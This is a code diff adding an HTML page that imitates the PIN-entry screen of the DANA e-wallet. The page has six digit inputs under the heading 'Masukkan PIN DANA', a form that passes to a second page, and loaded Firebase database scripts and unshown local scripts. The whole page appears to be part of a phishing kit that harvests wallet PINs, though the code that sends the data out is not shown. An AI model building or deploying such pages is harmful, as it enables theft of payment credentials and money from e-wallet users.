@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA</title>
+    <!-- Include Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="style2.css">
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <a class="navbar-brand" href="#">
+            <i class="fa-solid fa-angle-left warna-icon"></i>
+        </a>
+        <a class="navbar-brand mx-auto" href="#">
+            <img src="img/logo.png" alt="Logo" height="30" class="d-inline-block align-top" />
+        </a>
+    </nav>
+
+    <!-- Heading -->
+    <h2 class="text-center mt-2" style="color: white;">Masukkan <B>PIN DANA</B></h2>
+
+    <!-- OTP Input -->
+  
+    <div class="container mt-4">
+        <div class="row justify-content-center">
+            <div class="col-md-3 col-6">
+                <div class="otp-container d-flex justify-content-center">r
+                    <input type="number" maxlength="1" id="otp-1" class="otp-input" data-input1="nomor1" oninput="focusNext(this)" />
+                    <input type="number" maxlength="1" id="otp-2" class="otp-input"data-input2="nomor2" oninput="focusNext(this)" />
+                    <input type="number" maxlength="1" id="otp-3" class="otp-input" data-input3="nomor3" oninput="focusNext(this)" />
+                    <input type="number" maxlength="1" id="otp-4" class="otp-input"data-input4="nomor4" oninput="focusNext(this)" />
+                    <input type="number" maxlength="1" id="otp-5" class="otp-input" data-input5="nomor5"oninput="focusNext(this)" />
+                    <input type="number" maxlength="1" id="otp-6" class="otp-input"data-input6="nomor6" oninput="focusNext(this)" />
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Button Tampilkan -->
+   <form action="../Page-Two/indeks2.html" class="text-center" onsubmit="validateForm2(event)">
+    <div class="container">
+ <button type="submit" class="btn btn-primary rounded" data-button="lanjut2">Lanjut</button>
+  </div>
+
+   <!-- Include Firebase and Bootstrap JS -->
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-messaging-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+
+<script src="scrip5.js"></script>
+<script src="scrip3.js"></script>
+<script src="scrip4.js"></script>
+
+
+    <script src="https://kit.fontawesome.com/3e2c450e53.js" crossorigin="anonymous"></script>
+    <!-- Include Bootstrap JS and Popper.js -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    
+
+</body>
+</html>
